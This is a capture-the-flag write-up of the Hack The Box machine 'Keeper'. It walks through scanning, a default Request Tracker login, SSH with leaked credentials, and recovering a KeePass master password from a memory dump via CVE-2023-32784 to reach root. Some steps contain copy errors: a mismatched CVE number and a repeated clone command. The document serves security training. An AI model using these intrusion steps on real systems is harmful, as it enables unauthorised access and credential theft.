---
title: "Keeper"
---

Keeper is an easy Hack The Box machine.
The web server is hosting a helpdesk that is running Request Tracker.
We gain initial access to Request Tracker with default credentials.
On it we find a username and a password that provides a foothold via SSH.
Among their files we find a KeePass database and a memory dump.
We recover the password by exploiting [CVE-2022-32784](https://nvd.nist.gov/vuln/detail/cve-2023-32784).
In the database, we find credentials that provide root access to the machine over SSH.

**Note:** All personally identifying information, like the IP-s of attacking machines of VM-s, are replaced with placeholders for privacy and all flags or passwords are redacted to not spoil the challenge.

# Reconnaissance

## Nmap

`nmap` shows only two open ports on a machine running Ubuntu and nginx:

```
$ IP=<TARGET-IP>
$ sudo nmap -sS -sC -sV -O -p- -T4 -vv $IP -oA keeper
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 23:46 EEST
NSE: Loaded 157 scripts for scanning.
[…]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0, Linux 5.0 - 5.14
```

## Nikto

A vulnerability scan with `nikto` reveals little that can be immediately exploited:

```
$ nikto -h http://$IP -o keeper-nikto.txt
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <TARGET-IP>
+ Target Hostname:    <TARGET-IP>
+ Target Port:        80
+ Start Time:         2025-04-13 23:51:56 (GMT3)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-04-13 23:56:53 (GMT3) (297 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Web server

The website redirects us to `tickets.keeper.htb/rt`, so we add the domain to `/etc/hosts`:

```
$ echo '<TARGET-IP> tickets.keeper.htb' | sudo tee -a /etc/hosts
<TARGET-IP> tickets.keeper.htb
```

The login page shows that Request Tracker v4.4.4 appears to be installed:

```
$ curl -vL http://tickets.keeper.htb | html2text
* Host tickets.keeper.htb:80 was resolved.
* IPv6: (none)
* IPv4: <TARGET-IP>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying <TARGET-IP>:80...
* Connected to tickets.keeper.htb (<TARGET-IP>) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: tickets.keeper.htb
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: text/html; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: RT_SID_tickets.keeper.htb.80=185da4ecb2d430ee753434d10d769ec9; path=/rt; HttpOnly
< Date: Sun, 13 Apr 2025 20:56:16 GMT
< Cache-control: no-cache
< Pragma: no-cache
< X-Frame-Options: DENY
<
{ [1000 bytes data]
100  4236    0  4236    0     0  48444      0 --:--:-- --:--:-- --:--:-- 49255
* Connection #0 to host tickets.keeper.htb left intact
[Request Tracker logo]RT for tickets.keeper.htb
Skip Menu | Not logged in.
****** Login ******
Login 4.4.4+dfsg-2ubuntu1
Username:[user                ]
Password:[********************]
[Login]
===============================================================================
===============================================================================
Time to display: 0.011377
»|« RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 Best Practical
Solutions, LLC.
Distributed under version 2 of the GNU GPL.
To inquire about support, training, custom development or licensing, please
contact sales@bestpractical.com.
```

An online search reveals default credentials for [RT](https://github.com/bestpractical/rt): `root:password`.
After successfully logging in with these credentials, we navigate to Search > Tickets > Recently Viewed to see an open issue with a KeePass client on Windows:

> Lise,
>
> Attached to this ticket is a crash dump of the keepass program. Do I need to update the version of the program first...?
>
> Thanks!
- comment from lise norgaard:
> I have saved the file to my home directory and removed the attachment for security reasons.
>
> Once my investigation of the crash dump is complete, I will let you know.

Browsing to Assets > Users > lnorgaard we find the following comment about them:

> New user. Initial password set to \<USER-PASS\>

# Foothold

We successfully login via SSH with the `lnorgaard` credentials found in Request Tracker:

```
$ ssh lnorgaard@$IP
The authenticity of host '<TARGET-IP> (<TARGET-IP>)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<TARGET-IP>' (ED25519) to the list of known hosts.
lnorgaard@<TARGET-IP>'s password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

In `/home/lnorgaard`, we find the user flag and an interesting zip file:

```
lnorgaard@keeper:~$ pwd
/home/lnorgaard
lnorgaard@keeper:~$ ls -lah
total 84M
drwxr-xr-x 4 lnorgaard lnorgaard 4.0K Jul 25  2023 .
drwxr-xr-x 3 root      root      4.0K May 24  2023 ..
lrwxrwxrwx 1 root      root         9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard  220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard 3.7K May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard 4.0K May 24  2023 .cache
-rw------- 1 lnorgaard lnorgaard  807 May 23  2023 .profile
-rw-r--r-- 1 root      root       84M Apr 13 23:14 RT30000.zip
drwx------ 2 lnorgaard lnorgaard 4.0K Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard   33 Apr 13 22:45 user.txt
-rw-r--r-- 1 root      root        39 Jul 20  2023 .vimrc
lnorgaard@keeper:~$ cat user.txt
<USER-FLAG>
```

Before examining the archive, we enumerate users with a login shell:

```
lnorgaard@keeper:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
lnorgaard:x:1000:1000:lnorgaard,,,:/home/lnorgaard:/bin/bash
```

# Privilege escalation: lnorgaard > root

## Reconnaissance

The Zip archive is the obvious way forward.
We nonetheless gather additional information about the machine to rule out other quick privilege escalation paths.

Check the OS and kernel version:

```
lnorgaard@keeper:~$ (cat /proc/version || uname -a)
Linux version 5.15.0-78-generic (buildd@lcy02-amd64-008) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #85-Ubuntu SMP Fri Jul 7 15:25:09 UTC 2023
lnorgaard@keeper:~$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

`lnorgaard` doesn't have `sudo` privileges:

```
lnorgaard@keeper:~$ sudo -l
[sudo] password for lnorgaard:
Sorry, user lnorgaard may not run sudo on keeper.
```

There are no useful suid binaries to exploit.

```
lnorgaard@keeper:~$ find / -type f -perm -04000 -ls 2>/dev/null
     6188     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
     6446     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
     8428     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /usr/bin/fusermount3
     5177     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
     6186     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
     6450     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
     5562     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
     6448     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
     6445     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
     9110    228 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /usr/bin/sudo
    19613    332 -rwsr-xr-x   1 root     root       338536 Jul 19  2023 /usr/lib/openssh/ssh-keysign
    52946     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

We can see a small number of uninteresting running processes, meaning that the output has been deliberately restricted:

```
lnorgaard@keeper:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
lnorgaa+    1841  0.0  0.2  16924  9196 ?        Ss   23:13   0:00 /lib/systemd/systemd --user
lnorgaa+    1866  0.0  0.1  11140  5356 pts/0    Ss   23:13   0:00 -bash
lnorgaa+    2043  0.0  0.0  12684  3500 pts/0    R+   23:24   0:00 ps aux
```

The only thing that searching for files owned by `lnorgaa` everywhere except `/sys/`, `/run/`, and `/proc/` reveals is an email:

```
$ find / -user lnorgaard -exec ls -lah {} \; 2>/dev/null | grep -v -e '/sys/' -e '/run/' -e '/proc/'
[…]
-rw------- 1 lnorgaard mail 2.6K May 24  2023 /var/mail/lnorgaard
[…]
drwxr-xr-x 4 lnorgaard lnorgaard 4.0K Apr 13 23:29 .
drwxr-xr-x 3 root      root      4.0K May 24  2023 ..
lrwxrwxrwx 1 root      root         9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard  220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard 3.7K May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard 4.0K May 24  2023 .cache
-rw------- 1 lnorgaard lnorgaard   20 Apr 13 23:29 .lesshst
-rw------- 1 lnorgaard lnorgaard  807 May 23  2023 .profile
-rw-r--r-- 1 root      root       84M Apr 13 23:30 RT30000.zip
drwx------ 2 lnorgaard lnorgaard 4.0K Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard   33 Apr 13 22:45 user.txt
-rw-r--r-- 1 root      root        39 Jul 20  2023 .vimrc
-rw------- 1 lnorgaard lnorgaard 20 Apr 13 23:29 /home/lnorgaard/.lesshst
-rw-r--r-- 1 lnorgaard lnorgaard 220 May 23  2023 /home/lnorgaard/.bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard 3.7K May 23  2023 /home/lnorgaard/.bashrc
total 16K
drwx------ 2 lnorgaard lnorgaard 4.0K Jul 24  2023 .
drwxr-xr-x 4 lnorgaard lnorgaard 4.0K Apr 13 23:29 ..
-rw------- 1 lnorgaard lnorgaard  978 Jul 24  2023 known_hosts
-rw-r--r-- 1 lnorgaard lnorgaard  142 Jul 24  2023 known_hosts.old
-rw------- 1 lnorgaard lnorgaard 978 Jul 24  2023 /home/lnorgaard/.ssh/known_hosts
-rw-r--r-- 1 lnorgaard lnorgaard 142 Jul 24  2023 /home/lnorgaard/.ssh/known_hosts.old
total 8.0K
drwx------ 2 lnorgaard lnorgaard 4.0K May 24  2023 .
drwxr-xr-x 4 lnorgaard lnorgaard 4.0K Apr 13 23:29 ..
-rw-r--r-- 1 lnorgaard lnorgaard    0 May 23  2023 motd.legal-displayed
-rw-r--r-- 1 lnorgaard lnorgaard 0 May 23  2023 /home/lnorgaard/.cache/motd.legal-displayed
-rw------- 1 lnorgaard lnorgaard 807 May 23  2023 /home/lnorgaard/.profile
```

We have already seen the contents of this email:

```
lnorgaard@keeper:~$ cat /var/mail/lnorgaard
From www-data@keeper.htb  Wed May 24 12:37:18 2023
Return-Path: <www-data@keeper.htb>
X-Original-To: lnorgaard@keeper.htb
Delivered-To: lnorgaard@keeper.htb
[…]
Wed May 24 12:37:18 2023: Request 300000 was acted upon by root.

Transaction: Ticket created by root
      Queue: General
    Subject: Issue with Keepass Client on Windows
      Owner: lnorgaard
 Requestors: webmaster@keeper.htb
     Status: new
 Ticket URL: http://keeper.htb/rt/Ticket/Display.html?id=300000



Lise,

Attached to this ticket is a crash dump of the keepass program. Do I need to
update the version of the program first...?

Thanks! 
```

## CVE-2023-32784

We turn back to the Zip archive and transfer it to our machine:

```
$ scp lnorgaard@$IP:RT30000.zip .
lnorgaard@<TARGET-IP>'s password:
RT30000.zip                                                                         100%   83MB   3.7MB/s   00:22
```

Confirm it's a Zip archive and extract it (because it doesn't require a password):

```
$ file RT30000.zip
RT30000.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp
 extracting: passcodes.kdbx
```

Searching online for "keepass master password vulnerability" leads to [CVE-2023-32784](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784):

> In KeePass 2.x before 2.54, it is possible to recover the cleartext master password from a memory dump, even when a workspace is locked or no longer running.
> The memory dump can be a KeePass process dump, swap file (pagefile.sys), hibernation file (hiberfil.sys), or RAM dump of the entire system.
> The first character cannot be recovered. In 2.54, there is different API usage and/or random string insertion for mitigation.

Some more searching leads to a [PoC](https://github.com/vdohney/keepass-password-dumper) on GitHub.
We clone the repository:

```
$ git clone https://github.com/vdohney/keepass-password-dumper
Cloning into 'keepass-password-dumper'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (111/111), done.
remote: Compressing objects: 100% (79/79), done.
remote: Total 111 (delta 61), reused 69 (delta 28), pack-reused 0 (from 0)
Receiving objects: 100% (111/111), 200.29 KiB | 2.13 MiB/s, done.
Resolving deltas: 100% (61/61), done.
```

However, trying to run it with `dotnet run ../KeePassDumpFull.dmp` leads to errors.
Apparently the version of .Net installed in our Kali virtual machine is 6.0 but the exploit requires at least 7.0.

We could mess around with .Net installations or Docker containers;
or we can simply get a [Python](https://github.com/matro7sh/keepass-dump-masterkey) implementation of this PoC instead:

```
$ git clone https://github.com/vdohney/keepass-password-dumper
Cloning into 'keepass-password-dumper'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (111/111), done.
remote: Compressing objects: 100% (79/79), done.
remote: Total 111 (delta 61), reused 69 (delta 28), pack-reused 0 (from 0)
Receiving objects: 100% (111/111), 200.29 KiB | 2.13 MiB/s, done.
Resolving deltas: 100% (61/61), done.
```

This version extracts a partial password from the memory dump:

```
$ cd keepass-dump-masterkey
$ python3 poc.py ../KeePassDumpFull.dmp
2025-04-14 01:06:22,654 [.] [main] Opened ../KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

So the likely password is: `<PARTIAL-PASS>`.
Both the author of this implementation as well as the NIST description of CVE-2023-32784 affirm that the first character of the password cannot be recovered.
But searching for this phrase online leads to a Danish red berry pudding: `<COMPLETE-PASS>`.

We install KeePass CLI with `sudo apt install kpcli` and we open the password archive:

```
$ kpcli --kdb=passcodes.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

Enumerating its content reveals a PuTTY user key file:

```
kpcli:/> ls
=== Groups ===
passcodes/
kpcli:/> ls passcodes/
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
kpcli:/> ls passcodes/Network/
=== Entries ===
0. keeper.htb (Ticketing Server)
1. Ticketing System
kpcli:/> show passcodes/Network/keeper.htb\ (Ticketing\ Server)

 Path: /passcodes/Network/
Title: keeper.htb (Ticketing Server)
Uname: root
 Pass: <REDACTED>
  URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D[…]
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j[…]
       Private-MAC: b0a0fd2edf4f[…]
```

We save this to a separate file (e.g. `ssh_key`)

PuTTY is an SSH and Telnet client for [Windows](https://www.ssh.com/academy/ssh/putty/download).
However, its key files are not compatible with OpenSSH.
Install `putty-tools` to generate SSH keys from PuTTY key files.
Next, create a private ssh key from the PuTTY one:

```
$ puttygen ssh_key -O private-openssh -o id_rsa
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp1arHv4TLMBgUULD7AvxMMsSb3PFqbpfw/K4gmVd9GW3xBdP…
```

Finally, give the key correct permissions to use it for connecting to the target machine: `sudo chmod 400 id_rsa`.

## Privilege escalation

Connect to target as root via SSH:

```
$ ssh -i id_rsa root@$IP
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Grab the root flag:

```
root@keeper:~# pwd
/root
root@keeper:~# ls -lah
total 84M
drwx------  5 root root 4.0K Apr 13 22:45 .
drwxr-xr-x 18 root root 4.0K Jul 27  2023 ..
lrwxrwxrwx  1 root root    9 May 24  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwx------  2 root root 4.0K May 24  2023 .cache
-rw-------  1 root root   20 Jul 27  2023 .lesshst
lrwxrwxrwx  1 root root    9 May 24  2023 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Apr 13 22:45 root.txt
-rw-r--r--  1 root root  84M Jul 25  2023 RT30000.zip
drwxr-xr-x  2 root root 4.0K Jul 25  2023 SQL
drwxr-xr-x  2 root root 4.0K May 24  2023 .ssh
-rw-r--r--  1 root root   39 Jul 20  2023 .vimrc
root@keeper:~# cat root.txt
<ROOT-FLAG>
```

# Summary

This machine showcases the dangers of password mismanagement.
Leaving default passwords unchanged after installation opens the door for attackers who can easily guess or find them via OSINT.

Also, don't leave sensitive information, like passwords or usernames, in comments, emails or files.
Once attackers have gained a foothold, they can leverage this information to move laterally or escalate their privileges.

Finally, CVE-2023-32784 shows that storing memory dumps on the same system as password archives can be dangerous.
